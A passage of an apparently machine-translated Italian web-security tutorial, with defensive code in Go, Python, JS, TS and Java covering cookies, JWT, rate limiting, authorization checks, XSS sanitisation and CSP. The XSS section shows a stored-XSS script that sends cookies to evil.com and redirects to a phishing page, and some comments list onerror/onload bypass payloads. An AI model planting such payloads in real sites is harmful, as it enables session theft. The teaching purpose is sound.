+HttpOnly, Secure, SameSite: tre flag, tre intere classi di attacco
+
+```go title="the secure cookie"
+http.SetCookie(w, &http.Cookie{
+    Name:     "session_id",
+    Value:    sessionID,
+    HttpOnly: true,          // JS cannot access
+    Secure:   true,           // HTTPS only
+    SameSite: http.SameSiteStrictMode,  // no cross-site
+    MaxAge:   7 * 24 * 3600, // 7 days
+    Path:     "/",
+})
+```
+
+```python title="the secure cookie"
+response.set_cookie(
+    key="session_id",
+    value=session_id,
+    httponly=True,      # JS cannot access
+    secure=True,        # HTTPS only
+    samesite="strict",  # no cross-site
+    max_age=7 * 24 * 3600,  # 7 days
+    path="/",
+)
+```
+
+```js title="the secure cookie"
+res.cookie('session_id', sessionId, {
+  httpOnly: true,   // JS cannot access
+  secure: true,     // HTTPS only
+  sameSite: 'strict', // no cross-site
+  maxAge: 7 * 24 * 3600 * 1000, // 7 days, in MILLISECONDS here
+  path: '/',
+})
+
+// Two Express-specific traps:
+//  1. maxAge is milliseconds, unlike the Set-Cookie header's seconds.
+//     Copying 604800 across gives you a ten-minute session.
+//  2. `secure: true` behind a reverse proxy needs app.set('trust proxy', 1),
+//     or Express sees plain HTTP and silently refuses to set the cookie.
+```
+
+```ts title="the secure cookie"
+import type { CookieOptions, Response } from 'express'
+
+// Defining the options ONCE, as a typed constant, is the point. Cookie
+// flags are set in several places (login, refresh, logout) and the one
+// that quietly omits `httpOnly` is the one that gets exploited.
+const SESSION_COOKIE: CookieOptions = {
+  httpOnly: true,     // JS cannot access, so an XSS cannot steal it
+  secure: true,       // HTTPS only, so it cannot leak in cleartext
+  sameSite: 'strict', // no cross-site, which is most of CSRF gone
+  maxAge: 7 * 24 * 3600 * 1000, // 7 days, in milliseconds
+  path: '/',
+}
+
+export function setSession(res: Response, sessionId: string): void {
+  res.cookie('session_id', sessionId, SESSION_COOKIE)
+}
+
+// Clearing must repeat the SAME path and flags, or the browser treats
+// it as a different cookie and the old one survives the logout.
+export function clearSession(res: Response): void {
+  res.clearCookie('session_id', { ...SESSION_COOKIE, maxAge: undefined })
+}
+```
+
+```java title="the secure cookie"
+ResponseCookie cookie = ResponseCookie.from("session_id", sessionId)
+    .httpOnly(true)       // JS cannot access
+    .secure(true)         // HTTPS only
+    .sameSite("Strict")   // no cross-site
+    .maxAge(Duration.ofDays(7))
+    .path("/")
+    .build();
+
+response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+
+// Use ResponseCookie, not the older javax/jakarta Cookie class: that one
+// has no SameSite setter at all, so code using it silently ships without
+// the flag that does most of the CSRF work.
+
+// With Spring Session the same thing is configuration rather than code:
+//   server.servlet.session.cookie:
+//     http-only: true
+//     secure: true
+//     same-site: strict
+//     max-age: 7d
+```
+
+<Callout type="info">
+**Non archiviare mai ID di sessione o token JWT in localStorage.** LocalStorage è accessibile da qualsiasi JavaScript nella pagina. Una vulnerabilità XSS = tutte le sessioni rubate. Usalo sempre `HttpOnly` biscotti.
+</Callout>
+
+07
+
+## JWT: autenticazione senza stato
+
+Un JWT (JSON Web Token) è un'alternativa alle sessioni lato server. Invece di archiviare i dati della sessione nel DB e inviare solo un ID al client, il JWT _contiene_ i dati della sessione, firmati crittograficamente in modo che non possano essere manomessi.
+
+### Struttura JWT
+
+<Diagram caption="Fig 4: JWT: three Base64-encoded parts joined by dots. Payload is readable, but tamper-proof via signature.">
+<svg viewBox="0 0 680 100" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="100" fill="var(--dg-paper)"></rect><rect x="20" y="30" width="160" height="40" rx="6" fill="var(--dg-ok)"></rect><text x="100" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Intestazione</text><text x="100" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">alg: HS256, tipo: JWT</text><text x="193" y="52" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="14">.</text><rect x="200" y="30" width="260" height="40" rx="6" fill="var(--dg-info)"></rect><text x="330" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Carico utile (reclami)</text><text x="330" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">sub: user_id, iat, exp, ruolo: &quot;admin&quot;</text><text x="463" y="52" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="14">.</text><rect x="470" y="30" width="190" height="40" rx="6" fill="var(--dg-info)"></rect><text x="565" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Firma</text><text x="565" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">HMAC(intestazione+carico utile, segreto)</text></svg>
+</Diagram>
+
+<Callout type="info">
+**Il payload NON è crittografato, ma solo firmato.** È codificato Base64, che chiunque può decodificare. Non archiviare mai dati sensibili (password, PII, numeri di carta di credito) nelle richieste JWT. Memorizza solo ciò di cui il server ha bisogno (ID utente, ruolo) e ciò che è sicuro se esposto.
+</Callout>
+
+### JWT vs Sessioni: quando utilizzare quale
+
+#### Sessioni (con stato) preferite
+
+- Revoca istantanea, elimina la riga della sessione
+- Nessun dato esposto al cliente
+- Architettura più semplice per la maggior parte dei SaaS
+- Scalabile con Redis (archivio sessioni condivise)
+- Consigliato dalla maggior parte degli esperti di sicurezza
+
+#### JWT (senza stato)
+
+- Nessuna ricerca DB per richiesta (più veloce su larga scala)
+- La revoca è difficile, è necessaria una lista nera o una scadenza breve
+- Se l'account è compromesso, non è possibile forzare la disconnessione immediata
+- Soluzioni alternative: scadenza breve (5-10 minuti) + token di aggiornamento
+- Utilizzare solo se l'assenza di stato è un requisito difficile
+
+### Se è necessario utilizzare JWT: migliori pratiche
+
+- **Scadenza breve del token di accesso**: 5-15 minuti. I token di lunga durata sono token rubati che non scadono mai.
+- **Rotazione dei token di aggiornamento**: emette una nuova coppia di token di accesso + aggiornamento ad ogni aggiornamento. Memorizzato lato server.
+- **Archiviazione di cookie solo Http**: non localStorage. XSS non può rubare ciò che JS non può leggere.
+- **Segreto forte**: &gt;=segreto casuale a 256 bit per la firma HMAC. Ruotalo periodicamente.
+- **Verifica ad ogni richiesta**: non fidarti di un JWT solo perché è ben formato. Verificare sempre la firma.
+
+08
+
+## Endpoint di autenticazione con limitazione della velocità
+
+Senza limitazione di velocità, un utente malintenzionato può inviare milioni di tentativi di accesso al secondo, per forzare le password o per disattivare il server (DoS). La limitazione della velocità è **obbligatoria** su tutti gli endpoint di autenticazione.
+
+### Tre livelli di limitazione della velocità
+
+<Diagram caption="Fig 5: Three-layer rate limiting: each layer catches attacks that bypass the previous one.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="rl" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker></defs><rect x="20" y="30" width="180" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="110" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Livello 1: per IP</text><text x="110" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">10 tentativi/minuto</text><text x="110" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassato da botnet/IP rotanti</text><line x1="202" y1="65" x2="238" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="240" y="30" width="200" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="340" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Livello 2: per account</text><text x="340" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">5 fallimenti -&gt; blocco 24 ore</text><text x="340" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassato dallo spray per password</text><line x1="442" y1="65" x2="478" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="480" y="30" width="180" height="70" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="570" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Livello 3: globale</text><text x="570" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">100 guasti/min in tutto il sistema</text><text x="570" y="89" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Avviso + CAPTCHA per tutti gli utenti</text><rect x="20" y="130" width="640" height="46" rx="8" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="340" y="152" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Attacco spray password</text><text x="340" y="168" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">Prova una password comune (&quot;123456&quot;) per milioni di account -&gt; evita il blocco per account. Solo la limitazione della velocità globale rileva questo problema.</text></svg>
+</Diagram>
+
+Vai a Python JavaScript TypeScript Java
+
+un token bucket per IP, controllato prima dell'esecuzione del gestore
+
+```go title="rate limiting / golang.org/x/time/rate"
+import (
+    "golang.org/x/time/rate"
+    "sync"
+    "net/http"
+)
+
+var (
+    mu       sync.Mutex
+    limiters = map[string]*rate.Limiter{}
+)
+
+// Per-IP limiter: 5 requests per second, burst of 10
+func getIPLimiter(ip string) *rate.Limiter {
+    mu.Lock()
+    defer mu.Unlock()
+    l, ok := limiters[ip]
+    if !ok {
+        l = rate.NewLimiter(5, 10)
+        limiters[ip] = l
+    }
+    return l
+}
+
+func RateLimitMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        ip := r.RemoteAddr
+        if !getIPLimiter(ip).Allow() {
+            http.Error(w, "too many requests", http.StatusTooManyRequests)
+            return
+        }
+        next.ServeHTTP(w, r)
+    })
+}
+```
+
+```python title="rate limiting / slowapi"
+from slowapi import Limiter, _rate_limit_exceeded_handler
+from slowapi.errors import RateLimitExceeded
+from slowapi.util import get_remote_address
+
+limiter = Limiter(key_func=get_remote_address)
+app.state.limiter = limiter
+app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
+
+
+# The strictest limit belongs on the endpoints an attacker actually
+# targets: login, password reset, signup. A global limit generous enough
+# for browsing is far too generous for credential stuffing.
+@app.post("/login")
+@limiter.limit("5/minute")
+async def login(request: Request, body: LoginRequest):
+    ...
+
+
+# For a multi-instance deployment, back it with Redis so the limit is
+# shared rather than per-process:
+#   Limiter(key_func=get_remote_address, storage_uri="redis://localhost:6379")
+```
+
+```js title="rate limiting / express-rate-limit"
+import rateLimit from 'express-rate-limit'
+import RedisStore from 'rate-limit-redis'
+
+const loginLimiter = rateLimit({
+  windowMs: 60_000, // 1 minute
+  limit: 5,         // 5 attempts per IP per window
+  standardHeaders: 'draft-7', // RateLimit-* response headers
+  legacyHeaders: false,
+
+  // Without a shared store this is PER PROCESS: five instances means
+  // five times the limit, and an attacker only has to be unlucky once.
+  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
+})
+
+app.post('/login', loginLimiter, loginHandler)
+
+// Behind a proxy, set app.set('trust proxy', 1) so req.ip is the real
+// client and not the load balancer, otherwise every request shares one
+// bucket and the limiter takes your whole site down instead.
+```
+
+```ts title="rate limiting / express-rate-limit"
+import rateLimit, { type Options } from 'express-rate-limit'
+
+// Three tiers, declared as data. The reason to write it this way is that
+// the numbers become reviewable in one place: it is very easy to protect
+// /login carefully and leave /password-reset on the global limit.
+const TIERS = {
+  global: { windowMs: 60_000, limit: 100 },
+  auth: { windowMs: 60_000, limit: 5 },
+  expensive: { windowMs: 60_000, limit: 10 },
+} as const satisfies Record<string, Pick<Options, 'windowMs' | 'limit'>>
+
+function limiter(tier: keyof typeof TIERS) {
+  return rateLimit({
+    ...TIERS[tier],
+    standardHeaders: 'draft-7',
+    legacyHeaders: false,
+    store: new RedisStore({ sendCommand: (...a: string[]) => redis.sendCommand(a) }),
+    // Key by ACCOUNT as well as IP on auth routes. An attacker spraying
+    // one password across many accounts from many IPs defeats a pure
+    // per-IP limit entirely, which is how credential stuffing works.
+    keyGenerator: (req) =>
+      tier === 'auth' ? `${req.ip}:${String(req.body?.email ?? '')}` : (req.ip ?? 'unknown'),
+  })
+}
+
+app.use(limiter('global'))
+app.post('/login', limiter('auth'), loginHandler)
+app.post('/password-reset', limiter('auth'), resetHandler)
+```
+
+```java title="rate limiting / Bucket4j"
+// Bucket4j is a token bucket, the same algorithm as the Go tab, and it
+// has a Redis-backed mode so the limit is shared across instances.
+@Component
+public class RateLimitFilter extends OncePerRequestFilter {
+    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
+
+    // Per-IP: 5 requests per second, burst of 10
+    private Bucket newBucket() {
+        return Bucket.builder()
+            .addLimit(limit -> limit.capacity(10).refillGreedy(5, Duration.ofSeconds(1)))
+            .build();
+    }
+
+    @Override
+    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
+                                    FilterChain chain)
+            throws ServletException, IOException {
+        String ip = clientIp(req);
+        Bucket bucket = buckets.computeIfAbsent(ip, k -> newBucket());
+
+        if (!bucket.tryConsume(1)) {
+            res.setHeader("Retry-After", "1");
+            res.sendError(429, "too many requests");
+            return; // the controller never runs
+        }
+
+        chain.doFilter(req, res);
+    }
+}
+
+// The in-memory map above has the same flaw the Go tab does, and it is
+// worth naming: nothing ever removes entries, so it grows with every
+// distinct IP until the process runs out of heap. Use an eviction cache
+// (Caffeine with expireAfterAccess) or a Redis-backed proxy manager.
+```
+
+09
+
+## Vulnerabilità dell'autorizzazione: BOLA e BFLA
+
+> "L'autenticazione ti dice chi è l'utente. L'autorizzazione ti dice cosa gli è permesso fare. La maggior parte degli ingegneri ottiene l'autenticazione giusta e l'autorizzazione sbagliata."
+
+### L'errore fondamentale
+
+L'autorizzazione viene controllata a livello di routing (middleware). Gli ingegneri quindi presuppongono: _"l'utente ha superato l'autenticazione, quindi può accedere a qualsiasi cosa da qui."_ Questo crea un pericoloso falso senso di sicurezza.
+
+<Diagram caption="Fig 6: Auth checks at routing layer don't protect data at the DB layer. Add ownership checks in the query.">
+<svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="220" fill="var(--dg-paper)"></rect><defs><marker id="az" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="azr" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="azg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker></defs><rect x="20" y="60" width="100" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="70" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Router</text><line x1="122" y1="80" x2="148" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="150" y="50" width="110" height="60" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="205" y="75" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11" font-weight="700">Middleware di autenticazione</text><text x="205" y="92" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-diagram-mono)" font-size="10">autenticato</text><line x1="262" y1="80" x2="288" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="290" y="60" width="90" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="335" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Gestore</text><line x1="382" y1="80" x2="408" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="410" y="60" width="90" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="455" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Servizio</text><line x1="502" y1="80" x2="528" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="530" y="60" width="120" height="40" rx="6" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="590" y="82" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Deposito &lt;-</text><text x="590" y="95" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">SELECT * DOVE id=5</text><text x="590" y="135" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">VULNERABILE</text><text x="590" y="150" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Nessun controllo della proprietà dell'utente</text><text x="590" y="165" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Qualsiasi utente può recuperare qualsiasi ID</text><rect x="530" y="180" width="140" height="30" rx="6" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="600" y="199" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-diagram-mono)" font-size="9">DOVE id=5 E user_id=$ctx</text></svg>
+</Diagram>
+
+### (1) BOLA: Autorizzazione a livello di oggetto danneggiato
+
+_(Chiamato anche IDOR, Insecure Direct Object Reference)_
+
+L'utente A può accedere, modificare o eliminare le risorse dell'utente B indovinando o ripetendo i propri ID.
+
+```sql title="the BOLA fix"
+--VULNERABLE: fetches invoice 5 regardless of who is asking
+SELECT * FROM invoices WHERE id = $1
+
+-- FIXED: also requires the invoice to belong to the requesting user
+SELECT * FROM invoices
+WHERE  id = $1
+  AND  user_id = $2    -- $2 comes from the verified session/JWT, not user input
+
+-- If no row: return 404 (not 403)
+-- Why 404? A 403 CONFIRMS the resource exists -> information leak
+-- A 404 gives the attacker no information -> is it missing, or forbidden?
+```
+
+<Callout type="info">
+Restituisce **404 Non trovato** (non 403 Forbidden) quando un utente richiede una risorsa di cui non è proprietario. Un 403 dice all'aggressore "questo esiste, ma non puoi averlo", confermando l'esistenza della risorsa consente ulteriori attacchi (enumerazione, ingegneria sociale).
+</Callout>
+
+### (2) BFLA: Autorizzazione del livello di funzione interrotta
+
+Un utente normale accede agli endpoint di solo amministratore perché mancano i controlli del ruolo a livello di routing. Credere che "nessuno conosca l'URL /admin" è **sicurezza attraverso l'oscurità**: che non è affatto sicurezza.
+
+Vai a Python JavaScript TypeScript Java
+
+l'assegno risiede nel middleware, quindi nessun gestore può dimenticarlo
+
+```go title="the role middleware"
+func RequireRole(role string) func(http.Handler) http.Handler {
+    return func(next http.Handler) http.Handler {
+        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+            user, ok := r.Context().Value("user").(User)
+            if !ok || user.Role != role {
+                http.Error(w, "forbidden", http.StatusForbidden)
+                return
+            }
+            next.ServeHTTP(w, r)
+        })
+    }
+}
+
+// Router setup
+r.With(RequireAuth, RequireRole("admin")).
+  Get("/admin/invoices", adminInvoicesHandler)
+```
+
+```python title="the role dependency"
+from fastapi import Depends, HTTPException
+
+
+def require_role(role: str):
+    def checker(user: User = Depends(get_current_user)) -> User:
+        if user.role != role:
+            raise HTTPException(403, "forbidden")
+        return user
+    return checker
+
+
+# Router setup: the dependency runs BEFORE the handler body
+@app.get("/admin/invoices")
+async def admin_invoices(user: User = Depends(require_role("admin"))):
+    return await fetch_all_invoices()
+```
+
+```js title="the role middleware"
+export function requireRole(role) {
+  return (req, res, next) => {
+    const user = req.context?.user
+    if (!user || user.role !== role) {
+      return res.status(403).send('forbidden') // short-circuit
+    }
+    next()
+  }
+}
+
+// Router setup
+app.get('/admin/invoices', requireAuth, requireRole('admin'), adminInvoicesHandler)
+
+// The failure mode to design against is not a broken check, it is a
+// MISSING one: a new admin route added next month without the
+// middleware. Mounting the guard on the router rather than per route
+// makes forgetting it structurally impossible:
+//   const admin = Router()
+//   admin.use(requireAuth, requireRole('admin'))
+//   admin.get('/invoices', adminInvoicesHandler)
+//   app.use('/admin', admin)
+```
+
+```ts title="the role middleware"
+import { Router, type NextFunction, type Request, type Response } from 'express'
+
+type Role = 'admin' | 'user'
+
+// A union rather than `string` means requireRole('admni') does not
+// compile. A typo in a role name otherwise fails OPEN in the worst way:
+// nobody matches, so nobody gets in, until someone "fixes" it by
+// loosening the check.
+export function requireRole(role: Role) {
+  return (req: Request, res: Response, next: NextFunction): void => {
+    const user = req.context?.user
+    if (!user || user.role !== role) {
+      res.status(403).send('forbidden')
+      return
+    }
+    next()
+  }
+}
+
+// Mount the guard on the ROUTER, so every route under /admin inherits
+// it and a future route cannot be added without one.
+const admin = Router()
+admin.use(requireAuth, requireRole('admin'))
+admin.get('/invoices', adminInvoicesHandler)
+
+app.use('/admin', admin)
+```
+
+```java title="method security"
+// Spring Security expresses this as an annotation on the method, checked
+// by a proxy before the body runs.
+@Configuration
+@EnableMethodSecurity
+class SecurityConfig { }
+
+@RestController
+class AdminController {
+
+    @PreAuthorize("hasRole('ADMIN')")
+    @GetMapping("/admin/invoices")
+    List<Invoice> adminInvoices() {
+        return invoiceService.findAll();
+    }
+}
+
+// Better still, put it in the filter chain so the rule covers the whole
+// URL space rather than one method at a time. A route added later under
+// /admin/** is then protected the moment it exists:
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .authorizeHttpRequests(auth -> auth
+            .requestMatchers("/admin/**").hasRole("ADMIN")
+            .requestMatchers("/login", "/signup").permitAll()
+            .anyRequest().authenticated())   // deny by default, always
+        .build();
+}
+
+// `.anyRequest().authenticated()` is the line that matters most: it
+// makes the policy deny-by-default, so forgetting a rule for a new
+// endpoint locks it down rather than exposing it.
+```
+
+### Il modello mentale orizzontale vs verticale
+
+#### Attacco Orizzontale (BOLA)
+
+- L'utente A legge/modifica le risorse dell'utente B
+- L'ambito si amplia _a tutti gli utenti_
+- Correzione: aggiungi `AND user_id = $ctx_user` ad ogni domanda
+- Restituisce 404, non 403
+
+#### Attacco verticale (BFLA)
+
+- L'utente normale accede alle funzioni di amministrazione
+- L'ambito aumenta _i livelli di privilegio_
+- Correzione: middleware dei ruoli su ogni percorso sensibile
+- Default-deny: nega tutto ciò che non è esplicitamente consentito
+
+### Utilizza UUID, non ID sequenziali, negli URL
+
+ID sequenziali (`/invoices/101`, `/invoices/102`) consentono agli aggressori di enumerare tutte le risorse. Un UUID simile `/invoices/f47ac10b-58cc-4372-a567-0e02b2c3d479` è effettivamente impercettibile, 2 ^ 122 valori possibili. Utilizza gli UUID come chiavi primarie in qualsiasi tabella i cui record sono esposti negli URL.
+
+10
+
+## Scripting tra siti (XSS)
+
+XSS si verifica quando il JavaScript di un utente malintenzionato viene eseguito nel browser di un altro utente, nel contesto della tua piattaforma. È un'iniezione, ma l'obiettivo è il motore HTML/JS del browser anziché il database.
+
+### Perché XSS è pericoloso
+
+JavaScript in esecuzione nel contesto della tua piattaforma può:
+
+- Leggi tutto `document.cookie` (token di sessione non protetti da HttpOnly).
+- Leggi `localStorage` (Token JWT, chiavi API).
+- Effettua richieste API come utente che ha effettuato l'accesso (rappresentazione).
+- Reindirizzare gli utenti a pagine di phishing per rubare credenziali.
+- Modificare il contenuto della pagina per ingannare l'utente (falsi moduli di accesso, falsi avvisi).
+
+### XSS archiviato: il tipo più pericoloso
+
+Un utente invia un commento/post contenente un file `<script>` etichetta. Il tuo server lo memorizza. Ogni utente che visualizza quel post ha lo script eseguito nel proprio browser.
+
+```html title="the stored XSS attack"
+<!-- Attacker submits this as a "comment" -->
+<script>
+  // Steal session cookie and send to attacker's server
+  fetch('https://evil.com/steal?c=' + document.cookie);
+
+  // Or silently redirect to phishing page
+  window.location = 'https://evil.com/fake-login';
+</script>
+
+<!-- This script is stored in your DB and injected into every user's browser -->
+```
+
+### Prevenzione: disinfettare prima di riporre
+
+Prima di archiviare qualsiasi codice HTML/markdown fornito dall'utente, elimina i tag e gli attributi pericolosi. Utilizza una libreria testata in battaglia; non scrivere mai il tuo disinfettante.
+
+Vai a Python JavaScript TypeScript Java
+
+un elenco di tag consentiti, mai un elenco di tag pericolosi
+
+```go title="bluemonday sanitisation"
+import "github.com/microcosm-cc/bluemonday"
+
+// Build the policy ONCE at startup, not per request: compiling it is
+// the expensive part and the policy is safe to share.
+var commentPolicy = func() *bluemonday.Policy {
+    p := bluemonday.NewPolicy()
+    p.AllowElements("p", "b", "i", "em", "strong", "ul", "ol", "li")
+    p.AllowAttrs("href").OnElements("a")
+    // Without this, href="javascript:..." survives the tag allow-list
+    // and you have an XSS through a link.
+    p.RequireParseableURLs(true)
+    p.AllowURLSchemes("http", "https", "mailto")
+    return p
+}()
+
+func SanitiseComment(rawHTML string) string {
+    return commentPolicy.Sanitize(rawHTML)
+}
+
+// bluemonday.UGCPolicy() is a ready-made policy for user-generated
+// content and is a reasonable default if you do not want to enumerate.
+```
+
+```python title="bleach sanitisation"
+import bleach
+
+ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
+ALLOWED_ATTRS = {'a': ['href']}
+
+def sanitise_comment(raw_html: str) -> str:
+    # Strip ALL tags not in allow-list, strip dangerous attributes
+    return bleach.clean(
+        raw_html,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRS,
+        strip=True  # strip disallowed, don't escape
+    )
+
+# <script>...</script> -> stripped entirely
+# <b>bold</b> -> kept
+# <img onerror="..."> -> attribute stripped
+```
+
+```js title="DOMPurify sanitisation"
+import createDOMPurify from 'dompurify'
+import { JSDOM } from 'jsdom'
+
+// DOMPurify needs a DOM. On the server, JSDOM provides one.
+const DOMPurify = createDOMPurify(new JSDOM('').window)
+
+const ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
+const ALLOWED_ATTR = ['href']
+
+export function sanitiseComment(rawHtml) {
+  return DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS, ALLOWED_ATTR })
+}
+
+// Do NOT write your own with a regex. HTML parsing is adversarial:
+// <img src=x onerror=alert(1)>, <svg/onload=...>, malformed tags that
+// browsers helpfully repair into working script. Every hand-rolled
+// "strip tags" function in history has been bypassed.
+```
+
+```ts title="DOMPurify sanitisation"
+import createDOMPurify from 'dompurify'
+import { JSDOM } from 'jsdom'
+
+const DOMPurify = createDOMPurify(new JSDOM('').window)
+
+// A branded type again, and here it earns its keep more than anywhere
+// else in this chapter: SafeHtml can only be produced by the sanitiser,
+// so a template that renders raw HTML can demand one and the compiler
+// will refuse any string that has not been through it.
+type SafeHtml = string & { readonly __brand: 'SafeHtml' }
+
+const CONFIG = {
+  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
+  ALLOWED_ATTR: ['href'],
+} as const
+
+export function sanitiseComment(rawHtml: string): SafeHtml {
+  return DOMPurify.sanitize(rawHtml, CONFIG) as SafeHtml
+}
+
+// render(html: SafeHtml) now cannot be called with req.body.comment,
+// which is the mistake this whole section exists to prevent.
+```
+
+```java title="OWASP Java HTML Sanitizer"
+import org.owasp.html.HtmlPolicyBuilder;
+import org.owasp.html.PolicyFactory;
+
+public final class CommentSanitiser {
+
+    // Built once; PolicyFactory is immutable and thread-safe.
+    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
+        .allowElements("p", "b", "i", "em", "strong", "ul", "ol", "li")
+        .allowElements("a")
+        .allowAttributes("href").onElements("a")
+        // Restrict the URL schemes, or href="javascript:..." gets through
+        .allowUrlProtocols("http", "https", "mailto")
+        .requireRelNofollowOnLinks()
+        .toFactory();
+
+    public static String sanitise(String rawHtml) {
+        return POLICY.sanitize(rawHtml);
+    }
+}
+
+// Thymeleaf and JSP escape by default on output, which is the other half
+// of the defence. The rule across all five tabs is the same: sanitise on
+// the way IN if you must store HTML, and escape on the way OUT always.
+```
+
+### Politica di sicurezza dei contenuti (CSP): ultima linea di difesa
+
+CSP è un'intestazione di risposta HTTP che indica al browser _esattamente_ quali script possono essere eseguiti. Anche se un aggressore inietta a `<script>` tag, il browser lo blocca se viola la policy.
+
+```http title="the CSP header"
+# Only load scripts from your own domain. Block all inline scripts.
+Content-Security-Policy: default-src 'self';
+                         script-src 'self';
+                         object-src 'none';
+                         base-uri 'self'
+```
+
+<Callout type="info">
+Il CSP è una rete di sicurezza, non un sostituto della sanificazione. Correggere prima la causa principale (disinfettare l'input), quindi aggiungere CSP come livello di difesa approfondito.
+</Callout>
+
+11
+
+## CSRF: falsificazione di richieste intersito
+
+CSRF sfrutta il fatto che i browser allegano automaticamente i cookie alle richieste, anche quando la richiesta proviene da un sito Web diverso. Un attaccante acceso `evil.com` può attivare una richiesta a `bank.com` e il tuo browser include il tuo `bank.com` cookie di sessione.
+
+<Callout type="info">
+**CSRF è in gran parte un problema risolto** negli stack moderni. Finché sei impostato `SameSite=Strict` o `SameSite=Lax` sul cookie di sessione (che i browser utilizzano per impostazione predefinita `Lax`) e configuri CORS correttamente, sei protetto. Questa sezione copre la teoria per i sistemi legacy.
+</Callout>
+
+### Mitigazioni
+
